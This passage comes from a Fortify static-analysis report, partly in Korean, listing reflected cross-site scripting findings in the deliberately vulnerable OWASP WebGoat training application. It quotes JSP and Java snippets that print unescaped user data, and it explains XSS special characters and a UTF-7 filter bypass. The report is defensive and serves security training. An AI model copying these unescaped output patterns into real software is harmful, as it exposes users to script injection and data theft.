다음 원칙은 속성 값에 적용됩니다.

- 큰따옴표로 묶은 속성 값에서 큰따옴표는 속성 값의 끝을 나타내기 때문에 특수합니다.

- 작은따옴표로 묶은 속성 값에서 작은따옴표는 속성 값의 끝을 나타내기 때문에 특수합니다.

- 따옴표가 없는 속성 값에서 공백 및 탭과 같은 공백 문자는 특수 문자입니다.

- "&amp;"는 특정 속성과 함께 사용될 때 문자 엔터티가 시작되는 곳이기 때문에 특수합니다. 

예를 들어, URL에서 검색 엔진은 결과 페이지 내에 사용자가 클릭만 하면 검색을 다시 실행할 수 있는 링크를 제공합니다. 이는 URL 내에 검색 쿼리를 인코딩하여 구현할 수 있는데 특수 문자를 추가로 도입하게 됩니다.

- 공백, 탭 및 줄 바꿈은 URL 끝을 나타내기 때문에 특수합니다.

- "&amp;"는 문자 엔터티의 시작을 나타내거나 CGI 매개 변수를 구분하기 때문에 특수합니다.

- ASCII가 아닌 문자(즉, ISO-8859-1 인코딩에서 127보다 큰 모든 문자)는 URL에 사용할 수 없기 때문에 이 상황에서 특수 문자로 간주됩니다.

- "%" 기호는 HTTP 이스케이프 시퀀스로 인코딩된 매개 변수가 서버 쪽 코드로 디코딩되는 경우 입력에서 필터링해야 합니다. 예를 들어, "%"는 "%68%65%6C%6C%6F"와 같은 입력이 웹 페이지에 나타날 때 "hello"가 되는 경우 필터링해야 합니다.


&lt;SCRIPT&gt; &lt;/SCRIPT&gt;의 본문 내에서:

- 세미콜론, 괄호, 중괄호 및 줄 바꿈 문자는 텍스트를 이전부터 존재하는 스크립트 태그에 바로 삽입하는 경우 필터링해야 합니다.

서버 쪽 스크립트:

- 입력의 느낌표(!)를 출력의 큰따옴표(")로 변환하는 서버 쪽 스크립트에는 추가 필터링이 필요합니다. 

기타 가능성:

- 공격자가 UTF-7로 요청을 제출하는 경우 특수 문자 "&lt;"가 '+ADw-'로 나타나고 필터링이 무시될 수 있습니다. 출력에 인코딩 형식을 명시적으로 지정하지 않는 페이지가 포함된 경우 일부 브라우저는 콘텐트(이 경우, UTF-7)에 기초하여 합리적으로 인코딩을 식별하려고 시도합니다.

응용 프로그램에서 XSS 공격을 확인하는 정확한 지점과 확인 과정에서 고려해야 하는 특수 문자를 식별한 후 다음 과제는 확인 과정에서 특수 문자를 처리하는 방법을 알아내는 것입니다. 특수 문자를 응용 프로그램의 올바른 입력으로 간주하지 않는 경우, 특수 문자가 들어 있는 모든 입력을 잘못된 것으로 판단하고 거부할 수 있습니다. 두 번째 옵션은 필터링으로 특수 문자를 제거하는 것입니다. 하지만 필터링은 필터링된 콘텐트의 표현을 변경시키는 부작용이 있기 때문에 입력 내용을 그대로 보존하여 표시해야 하는 경우에는 허용할 수 없습니다.

특수 문자가 있는 입력을 받아들여 그대로 표시해야 하는 경우, 검증 작업에서 특수 문자를 인코딩하여 특수한 의미를 제거해야 합니다. ISO 8859-1 특수 문자의 인코딩된 값의 완전한 목록이 공식 HTML 규격의 일부로 제공됩니다[2].

많은 응용 프로그램 서버가 응용 프로그램이 Cross-Site Scripting 공격에 필수적인 문자가 있는지 확인하는 특정 HTTP 응답 콘텐트 설정을 담당하는 기능을 구현하여 Cross-Site Scripting 취약점에 노출되는 것을 막으려고 합니다. 응용 프로그램을 실행하는 서버에 응용 프로그램의 보안을 맡길 수 없습니다. 개발된 응용 프로그램이 응용 프로그램의 수명 동안 어떤 서버에서 실행될지 알 수 없기 때문입니다. 표준 및 알려진 익스플로이트의 진화 속도에 따라 응용 프로그램 서버가 계속 진화한다는 보장이 없습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 데이터베이스에 신뢰할 수 없는 데이터를 쓰면 Fortify Secure Coding Rulepacks에서 SQL Injection 관련 경고를 표시하며, 데이터베이스를 신뢰할 수 없는 데이터의 소스로 처리하므로 XSS 취약성이 발생할 수 있습니다. 데이터베이스가 사용자 환경에서 신뢰할 수 있는 리소스인 경우, 사용자 지정 필터를 사용하여 DATABASE 감염 플래그를 포함하고 데이터베이스 소스에서 발생하는 데이터 흐름 이슈를 필터링하십시오. 그러나 데이터베이스에서 읽는 모든 내용을 확인하는 것이 여전히 효과적인 경우가 많습니다.

2. 비록 신뢰할 수 없는 데이터에 대한 URL 인코딩이 많은 XSS 공격을 막아주긴 하지만, 일부 브라우저(특히 Internet Explorer 6 및 7 그 외 다른 브라우저들)는 JavaScript 인터프리터로 전송하기 전에 DOM(Document Object Model) 내의 특정 지점에서 자동으로 내용을 해독합니다. 이러한 위험을 반영하기 위해 룰팩은 더 이상 Cross-Site Scripting을 방지하는 데 충분한 URL 인코딩 루틴을 처리하지 않습니다. URL 암호화 이후 도출되는 데이터 값으로 Fortify는 Cross-Site Scripting, Poor Validation 취약점을 보고할 수 있습니다.

3. Fortify AppDefender adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>242</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="78CD7BEB2AE8729CF4AFE74EFD66FAD2" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 51 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>51</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getStartDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="61328E483CA6FC6DA62F842B8350C9D4" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C2C623852930BD69E629E128CB53F741" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7FEBE6A998D09077823208338F926CF3" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 93 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>93</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionNotes()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="49CCE3700CA2FA08230DF1EE14E35818" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>				&lt;TR&gt;
					&lt;TD colspan="4"&gt;
						&lt;textarea name="&lt;%=RoleBasedAccessControl.DISCIPLINARY_NOTES%&gt;" cols="53" rows="2" wrap="off" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3BCA6468329D889E55882E321A6E53EA" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5891A40A8A255E418B5DC8268C7BBF09" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D5C3ED4CE0DAF762A1F6D507F0B2914F" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>BasicAuthentication.java의 doStage1() 메서드가 143 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>BasicAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BasicAuthentication.java</FilePath>
<LineStart>143</LineStart>
<Snippet>
	    row1.addElement(new TD(new Input(Input.TEXT, HEADER_NAME,
		    headerName.toString())));
	    row2.addElement(new TD(new Input(Input.TEXT, HEADER_VALUE,
		    headerValue.toString())));</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="34B726630369800850C455085CAE1693" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ReflectedXSS.java의 createContent() 메서드가 206 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ReflectedXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ReflectedXSS.java</FilePath>
<LineStart>206</LineStart>
<Snippet>		    .addElement("Enter your three digit access code:"));
	    tr.addElement(new TD().addElement(new Input(Input.TEXT, "field1",
		    param1)));
	    t.addElement(tr);
</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3C8DEDB72B3A3315575EA0CF1871FBBD" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A493D2690CC71E503B13D084F7A9CA95" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 99 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>99</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionNotes()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7884B40EA364F8FBC55C8D4866A3ED7F" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 33 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>33</LineStart>
<Snippet>						&lt;!-- STAGE 4 - FIX  Note that the description value below gets encoded and address1 here is not --&gt;

						&lt;%=employee.getAddress1()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F7B37F8EA76D3FD274FB7C141A2DAF36" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 123 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=CrossSiteScripting.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5424AC0BC8F5B3F9A0B16C57437C8C17" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ReportCardScreen.java의 makeFeedback() 메서드가 105 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ReportCardScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/ReportCardScreen.java</FilePath>
<LineStart>105</LineStart>
<Snippet>    {
	ElementContainer ec = new ElementContainer();
	ec.addElement(new Center(new StringElement(
		"Comments and suggestions are welcome. "
			+ s.getFeedbackAddress())));</Snippet>
<TargetFunction>org.apache.ecs.html.Center.Center()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5024E6BB4858C8B7A63CD909153B09C7" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9631C137D63081E4D8AECC2A1A4D3830" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 58 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>58</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F69C3ADA22EC28DAB6950119658418A6" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 21 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>21</LineStart>
<Snippet>						Last Name:					&lt;/TD&gt;
					&lt;TD width="196"&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
				  &lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7D7B7786B4CD3ECF6916DB8A6FB81A76" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 126 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
